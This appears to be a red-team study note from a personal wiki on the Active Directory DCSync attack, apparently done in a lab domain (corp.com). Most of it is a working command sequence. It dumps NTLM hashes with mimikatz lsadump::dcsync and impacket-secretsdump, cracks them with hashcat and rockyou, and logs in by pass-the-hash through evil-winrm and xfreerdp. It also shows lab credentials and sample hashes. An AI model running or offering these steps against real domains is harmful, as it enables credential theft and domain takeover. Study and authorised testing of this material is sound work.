---
title: DC Sync
parent: Active Directory
grand_parent: Red Team
nav_order: 302
---
# DC Synchronization

---

## Attack Overview
By spoofing replication and acting as a standby DC, an attacker can request credentials for any user in the domain from the DC.
### Prerequisites
A user with the following permissions is required:
- “Replicate directory changes”
- “Replicate all directory changes”
- “Replicate directory changes in a filtered set”

By default, the above permissions are assigned to members of the following groups:
- Domain Admins
- Enterprise Admins
- Administrators

# Performing from Windows (Intranet)
Log in as a user with Domain Admins permissions
```zsh
xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.75 /dynamic-resolution
```

```powershell
.\mimikatz.exe

lsadump::dcsync /user:corp\dave
```
- Target is dave
- If using krbtgt, change the “dave” part and execute
![](../../../assets/images/Pasted%20image%2020260507164022.png)

NTLM Hash

```
08d7a47a6f9f66b97b1bae4178747494
```

# Hash analysis
```zsh
echo ‘08d7a47a6f9f66b97b1bae4178747494’ > hashes.dcsync
```

```zsh
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
![](../../../assets/images/Pasted%20image%2020260507170957.png)

---
# Performing from Kali
## Retrieving hash values

```zsh
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:“BrouhahaTungPerorateBroom2023\!”@192.168.158.70
```
![](../../../assets/images/Pasted%20image%2020260507164044.png)

---
# Example

```powershell
lsadump::dcsync /user:corp\jeffadmin
```
![](../../../assets/images/Pasted%20image%2020260507164057.png)
```
e460605a9dbd55097c6cf77af2f89a03
```

# Evil-WinRM

```zsh
evil-winrm -i 192.168.184.70 -u jeffadmin -H e460605a9dbd55097c6cf77af2f89a03
```

# RDP

```zsh
sudo xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /pth:‘e460605a9dbd55097c6cf77af2f89a03’ /v:192.168.184.74 /dynamic-resolution
```
*This didn't work*